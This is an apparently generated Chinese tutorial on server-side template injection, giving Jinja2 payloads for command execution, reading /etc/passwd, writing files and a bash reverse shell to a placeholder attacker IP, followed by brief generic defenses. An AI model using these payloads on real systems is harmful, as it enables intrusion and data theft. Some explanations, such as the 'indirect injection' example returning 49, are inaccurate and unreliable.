### 服务端模板注入（SSTI）攻击技术详解

#### 1. 概述
服务端模板注入（Server-Side Template Injection, SSTI）是一种Web安全漏洞，攻击者通过向服务端模板引擎注入恶意代码，从而在服务器端执行任意代码。这种漏洞通常出现在使用模板引擎（如Jinja2、Twig、Freemarker等）的Web应用中，当用户输入被直接嵌入到模板中时，攻击者可以操纵模板的执行逻辑，导致严重的安全问题。

#### 2. 常见攻击手法

##### 2.1 直接模板注入
直接模板注入是最简单的攻击方式，攻击者直接将恶意代码插入到模板中。例如，在Jinja2模板引擎中，攻击者可以通过以下方式注入代码：

```python
{{ 7 * 7 }}
```

如果服务器返回49，说明模板引擎执行了注入的代码。攻击者可以进一步利用此漏洞执行更复杂的操作。

##### 2.2 间接模板注入
间接模板注入通常发生在模板引擎将用户输入作为模板的一部分进行处理时。例如，用户输入被用作模板变量，攻击者可以通过构造特定的输入来操纵模板的执行逻辑。

```python
{{ user_input }}
```

如果`user_input`是`{{ 7 * 7 }}`，服务器同样会返回49。

##### 2.3 利用模板引擎的特性
不同的模板引擎有不同的特性和语法，攻击者可以利用这些特性来执行更复杂的攻击。例如，在Jinja2中，攻击者可以利用`__builtins__`对象来访问Python的内置函数：

```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

通过这种方式，攻击者可以枚举所有可用的类，并找到可以利用的类来执行任意代码。

#### 3. 利用方式

##### 3.1 执行系统命令
攻击者可以通过SSTI漏洞执行系统命令。例如，在Jinja2中，攻击者可以利用`os`模块来执行命令：

```python
{{ ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['os'].popen('whoami').read() }}
```

这段代码会执行`whoami`命令并返回结果。

##### 3.2 读取敏感文件
攻击者可以利用SSTI漏洞读取服务器上的敏感文件。例如，读取`/etc/passwd`文件：

```python
{{ ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['open']('/etc/passwd').read() }}
```

##### 3.3 写入文件
攻击者还可以利用SSTI漏洞在服务器上写入文件。例如，创建一个包含恶意代码的文件：

```python
{{ ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['open']('/tmp/malicious.py', 'w').write('import os; os.system("whoami")') }}
```

##### 3.4 反弹Shell
攻击者可以利用SSTI漏洞在服务器上执行反弹Shell命令，从而获得对服务器的完全控制。例如，使用Python的`subprocess`模块执行反弹Shell：

```python
{{ ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['subprocess'].Popen(['bash', '-c', 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'], shell=True) }}
```

#### 4. 防御措施

##### 4.1 输入验证和过滤
对用户输入进行严格的验证和过滤，确保输入不包含任何可能被模板引擎解析的代码。

##### 4.2 使用安全的模板引擎
选择安全性较高的模板引擎，并确保其配置正确，避免使用不安全的特性。

##### 4.3 限制模板执行环境
在模板执行环境中限制可访问的对象和函数，避免攻击者利用内置函数和对象执行恶意代码。

##### 4.4 定期安全审计
定期对Web应用进行安全审计，及时发现和修复潜在的SSTI漏洞。

#### 5. 总结
服务端模板注入（SSTI）是一种严重的Web安全漏洞，攻击者可以通过注入恶意代码在服务器端执行任意操作。了解SSTI的常见攻击手法和利用方式，并采取有效的防御措施，对于保护Web应用的安全至关重要。通过严格的输入验证、使用安全的模板引擎、限制模板执行环境以及定期安全审计，可以有效地防止SSTI漏洞的利用。

---

*文档生成时间: 2025-03-11 13:32:44*






















